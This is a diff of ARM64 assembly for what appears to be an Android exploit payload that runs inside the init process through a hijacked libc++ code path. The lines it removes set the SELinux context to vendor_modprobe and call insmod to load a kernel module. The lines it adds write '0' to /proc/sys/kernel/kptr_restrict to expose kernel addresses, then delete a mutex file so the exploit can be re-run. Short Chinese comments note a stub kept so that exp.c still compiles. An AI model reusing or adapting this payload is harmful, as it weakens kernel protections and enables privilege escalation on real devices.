@@ -1,4 +1,4 @@
-    .arch armv8-a
+.arch armv8-a
 
     .include "include.inc"
 
@@ -8,25 +8,23 @@
     .global libcxx_first_inst_copy
     .data
 
-
 libcxx_data:
 
 mutex_file:
     .asciz "/dev/df"
-selinux_ctx:
-    .asciz "u:r:vendor_modprobe:s0"
-selinux_ctx_end:
-attr_exec:
-    .asciz "/proc/self/attr/exec"
-exe_path:
-    .asciz "/vendor/bin/insmod"
-ko_target:
-    .ascii "/vendor/lib64/libbinderdebug.so\0"
-    .skip 32, 0                             /* pad to 64 bytes — longest candidate path */
+kptr_file:
+    .asciz "/proc/sys/kernel/kptr_restrict"
+zero_str:
+    .asciz "0"
     .balign 4
+
+    /* 
+     * 保留这个符号，虽然我们不再需要写 KO 了，
+     * 但为了防止 exp.c 里的相关代码（strncpy 等）编译报错，留一个空占位。
+     */
     .global libcxx_ko_target_off
 libcxx_ko_target_off:
-    .int ko_target - libcxx_data
+    .int 0
 
     .align 4
 
@@ -46,13 +44,11 @@ libcxx_start:
     cbnz    w0, return
 
     // Detect init tid = 1
-    // We need thread 1 to use the default namespace
     mov     x8, SYS_gettid
     svc     0
     cmp     w0, 1
     bne     return
 
-    // To avoid later call of hook to execute payload, create file as mutex.
     // Mutex: openat(AT_FDCWD, "/dev/df", O_CREAT|O_EXCL|O_CLOEXEC, 0)
     mov     x0, -100
     adr     x1, mutex_file
@@ -64,67 +60,53 @@ libcxx_start:
     // return if fail to open (file exist)
     tbnz    w0, #31, return
 
-    sub     sp, sp, 16
-
-    // syscall(SYS_gettid);
-    mov     x8, SYS_gettid
-    svc     0
-    str     w0, [sp, 8]
-
-    // clone(CLONE_CHILD_SETTID   |
-    //       CLONE_CHILD_CLEARTID |
-    //       SIGCHLD, 0, NULL, NULL, &ctid)
+    // clone worker
     mov     x8, SYS_clone
-    add     x4, sp, 8           // ctid
-    mov     x3, xzr              // newtls
-    mov     x2, xzr              // ptid
     mov     x1, xzr              // stack
+    mov     x2, xzr              // ptid
+    mov     x3, xzr              // newtls
+    mov     x4, xzr              // ctid (不再需要)
     movl    x0, (CLONE_CHILD_SETTID | CLONE_CHILD_CLEARTID | SIGCHLD)
     svc     0
-    str     w0, [sp, 8]         // save id
-    add     sp, sp, 16
 
-    cbnz    w0, return          // parent returns to init
+    // parent returns to init
+    ret 
 
-    // ── worker child ──────────────────────────────────────────────────────
-    sub     sp, sp, 32
-
-    // Fork grandchild: set SELinux exec context → execve insmod
-    mov     x0, #SIGCHLD
-    mov     x1, xzr
-    mov     x2, xzr
-    mov     x3, xzr
-    mov     x4, xzr
-    mov     x8, #SYS_clone
-    svc     0
-    cbnz    w0, myexit
-
-    // ── grandchild: insmod the KO as vendor_modprobe ──────────────────────
-    // open /proc/self/attr/exec
+// ── worker child ──────────────────────────────────────────────────────
+worker:
+    // openat(AT_FDCWD, "/proc/sys/kernel/kptr_restrict", O_WRONLY, 0)
     mov     x0, -100
-    adr     x1, attr_exec
+    adr     x1, kptr_file
     movl    x2, (O_WRONLY|O_CLOEXEC)
+    mov     x3, xzr
     mov     x8, #SYS_openat
     svc     0
-    adr     x1, selinux_ctx
-    mov     x2, selinux_ctx_end - selinux_ctx
+
+    // if (fd < 0) exit
+    tbnz    w0, #31, myexit
+    mov     x19, x0              // save fd to x19
+
+    // write(fd, "0", 1)
+    mov     x0, x19
+    adr     x1, zero_str
+    mov     x2, #1
     mov     x8, #SYS_write
     svc     0
 
-    // execve("/vendor/bin/insmod", [exe_path, ko_target, NULL], NULL)
-    adr     x1, exe_path
-    str     x1, [sp]
-    adr     x1, ko_target
-    str     x1, [sp, 8]
-    str     xzr, [sp, 16]
-    adr     x0, exe_path
-    mov     x1, sp
-    mov     x2, xzr
-    mov     x8, #SYS_execve
+    // close(fd)
+    mov     x0, x19
+    mov     x8, #SYS_close
+    svc     0
+
+    // 顺便把 /dev/df 删了，这样你可以反复测试，不用每次重启
+    mov     x0, -100
+    adr     x1, mutex_file
+    mov     x8, #SYS_unlinkat
     svc     0
 
 myexit:
-    mov     x0, #1
+    // exit(0)
+    mov     x0, #0
     mov     x8, #SYS_exit
     svc     0
 
